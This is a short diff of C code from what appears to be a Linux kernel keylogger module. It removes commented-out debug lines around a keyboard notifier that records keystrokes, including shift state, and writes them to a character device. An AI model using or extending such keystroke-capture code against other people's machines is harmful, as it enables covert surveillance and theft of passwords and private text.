@@ -284,8 +284,6 @@ int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_para
     // https://elixir.bootlin.com/linux/latest/source/include/linux/notifier.h
     else if (KBD_KEYCODE == code)
     {
-        // printk(KERN_DEBUG "%s: code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n", DEVICE_NAME, code, param->down, param->shift, param->value);  // DEBUGGING
-
         // 0. Set shift key
         if (param->shift)
         {
@@ -310,10 +308,8 @@ int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_para
             // 2. Write the string to the character device
             if (msgLen > 0)
             {
-                // static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf);
                 tempRetVal = write_to_chrdev(&myLD, myKL.keyStr);
                 if (msgLen != tempRetVal)
-                // if (msgLen != write_to_chrdev(&myLD, myKL.keyStr))
                 {
                     HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_to_chrdev() has failed");  // DEBUGGING
                     printk(KERN_INFO "%s: write_to_chrdev() returned %d\n", DEVICE_NAME, tempRetVal);  // DEBUGGING
